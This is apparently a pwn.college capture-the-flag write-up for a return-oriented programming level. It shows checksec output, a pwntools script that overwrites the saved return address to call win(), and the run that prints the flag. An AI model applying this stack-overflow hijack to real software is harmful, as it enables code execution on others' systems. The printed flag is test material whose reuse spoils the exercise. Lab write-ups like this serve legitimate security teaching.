1. Read
hacker@return-oriented-programming-level-1-0:/challenge$ /challenge/babyrop_level1.0
###
### Welcome to /challenge/babyrop_level1.0!
###

This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!

In this challenge, there is a win() function.
win() will open the flag and send its data to stdout; it is at 0x401a84.
In order to get the flag, you will need to call this function.

You can call a function by directly overflowing into the saved return address,
which is stored at 0x7fffebefafa8, 40 bytes after the start of your input buffer.
That means that you will need to input at least 48 bytes (28 to fill the buffer,
12 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).

Received 1 bytes! This is potentially -5 gadgets.
Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable
from within this challenge. You will have to do that by yourself.

+--- Printing 4294967292 gadgets of ROP chain at 0x7fffebefafa8.

Leaving!
### Goodbye!

2. Check the security of the binary file. No canary found so we can just do as the challenge says
hacker@return-oriented-programming-level-1-0:/challenge$ checksec babyrop_level1.0
[*] '/challenge/babyrop_level1.0'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)


3. Construct the payload based on the information

from pwn import *

def construct_payload():
    win_function = 0x401a84

    # Construct the ROP chain
    rop_chain = cyclic(40)
    rop_chain += p64(win_function)
    return rop_chain


payload = construct_payload()
print("payload: ", end="")
print(payload)

p = process("/challenge/babyrop_level1.0")
p.send(payload)

output = p.recvall()
print(output.decode())
p.close()

4. Run it
hacker@return-oriented-programming-level-1-0:~$ /bin/python /home/hacker/Documents/1.py
payload: b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa\x84\x1a@\x00\x00\x00\x00\x00'
[+] Starting local process '/challenge/babyrop_level1.0': pid 19066
[+] Receiving all data: Done (1.29KB)
[*] Process '/challenge/babyrop_level1.0' stopped with exit code -11 (SIGSEGV) (pid 19066)
###
### Welcome to /challenge/babyrop_level1.0!
###

This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!

In this challenge, there is a win() function.
win() will open the flag and send its data to stdout; it is at 0x401a84.
In order to get the flag, you will need to call this function.

You can call a function by directly overflowing into the saved return address,
which is stored at 0x7ffd360f79f8, 40 bytes after the start of your input buffer.
That means that you will need to input at least 48 bytes (28 to fill the buffer,
12 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).
Received 48 bytes! This is potentially 1 gadgets.
Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable
from within this challenge. You will have to do that by yourself.

+--- Printing 2 gadgets of ROP chain at 0x7ffd360f79f8.
| 0x0000000000401a84: endbr64  ; push rbp ; mov rbp, rsp ; lea rdi, [rip + 0x705] ; call 0x401150 ; 
| 0x0000000000000000: (UNMAPPED MEMORY)

Leaving!
You win! Here is your flag:
pwn.college{UNzwIGuQlAwtj9EhqKArLgsHtzG.0VM0MDL2kDNzMzW}
